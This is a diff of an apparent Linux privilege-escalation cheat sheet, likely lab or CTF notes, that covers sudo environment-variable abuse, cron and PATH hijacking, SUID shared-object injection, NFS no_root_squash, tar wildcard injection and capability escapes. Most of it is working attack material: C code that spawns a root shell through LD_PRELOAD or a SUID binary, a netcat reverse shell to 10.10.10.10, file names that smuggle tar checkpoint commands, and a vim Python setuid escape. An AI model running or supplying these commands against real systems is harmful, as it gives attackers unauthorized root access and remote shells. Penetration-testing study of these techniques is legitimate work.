@@ -1,4 +1,4 @@
-#SERVICE EXPLOIT
+## SERVICE EXPLOIT
 https://www.exploit-db.com/exploits/1518
 
 COMPILE EXPLOIT:
@@ -19,9 +19,9 @@ RUN MALICIOUS SUID: /tmp/rootbash -p
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-#SUDO - ENVIRONMENT VARIABLES:
+## SUDO - ENVIRONMENT VARIABLES:
 
-#CHECK VULNERABILITY:
+CHECK VULNERABILITY:
 sudo -l
 Matching Defaults entries for user on this host:
 env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
@@ -34,23 +34,40 @@ LD_LIBRARY_PATH предоставляет список каталогов, в �
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
 #Run allowed program from sudo -l with compiled library:
 sudo LD_PRELOAD=/tmp/preload.so program-name-here
+
+LD_PRELOAD FILE:
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-#SUDO - ENVIRONMENT VARIABLES (another method):
+## SUDO - ENVIRONMENT VARIABLES (another method):
 
-#Check libraries of choosen program: ldd /usr/sbin/apache2
+Check libraries of choosen program: ldd /usr/sbin/apache2
 
-#Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) 
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) 
 using the code located at /home/user/tools/sudo/library_path.c:
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 
-#Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object)
+Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object)
 sudo LD_LIBRARY_PATH=/tmp apache2
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-#Cron Job - PATH ENVIRONMENT VARIABLE
+## Cron Job - PATH ENVIRONMENT VARIABLE
 
 Create file with exist cronjob name (cronjobs without absolute path)
 cat /etc/crontab
@@ -67,12 +84,12 @@ Give file execute permission: chmod +x /home/user/overwrite.sh
 --------------------------------------------------------------------------------
 #SUID/SGID Executables - Known Exploits
 
-#Find SUID/SGID files:
+https://gtfobins.github.io/
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-#SUID/SGID Executables - shared object injection
+## SUID/SGID Executables - shared object injection
 EXAMPLE:
 strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
 
@@ -104,7 +121,7 @@ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-#SUID / SGID Executables - Environment Variables
+## SUID / SGID Executables - Environment Variables
 One line ("service apache2 start") suggests that the service executable is being called to start the webserver, 
 however the full path of the executable (/usr/sbin/service) is not being used.
 
@@ -115,22 +132,22 @@ run executable.
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-#SUID / SGID Executables - Abusing Shell Features (#1)
+## SUID / SGID Executables - Abusing Shell Features (#1)
 function /usr/sbin/service { /bin/bash -p; }
 export -f /usr/sbin/service
 #Execute program that call "service"
 
-#SUID / SGID Executables - Abusing Shell Features (#2) Note: This will not work on Bash versions 4.4 and above.
+## SUID / SGID Executables - Abusing Shell Features (#2) Note: This will not work on Bash versions 4.4 and above.
 When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 /tmp/rootbash -p
 --------------------------------------------------------------------------------
-#Passwords & Keys - History Files 
+## Passwords & Keys - History Files 
 cat ~/.*history | less
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-#NFS SHARE
+## NFS SHARE
 
 cat /etc/exports
 On your Kali box, switch to your root user if you are not already running as root:
@@ -143,11 +160,31 @@ On victim: /tmp/shell.elf
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-#Kernel Exploits
+## NFS ("no_root_squash")
+Create SUID file in remote share
+FILE:
+int main(){
+setgid(0);
+setuid(0);
+system("/bin/bash");
+return 0;
+}
 --------------------------------------------------------------------------------
 ################################################################################
 --------------------------------------------------------------------------------
-CRON JOB WITH TAR ARCHIVING
+##Kernel Exploits
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+##CRON JOB WITH TAR ARCHIVING
+
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.10.10.10 4445 >/tmp/f" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+## GET CAPABILITIES
+
+getcap -r / 2>/dev/null //Example: -rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim
+vim -> :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
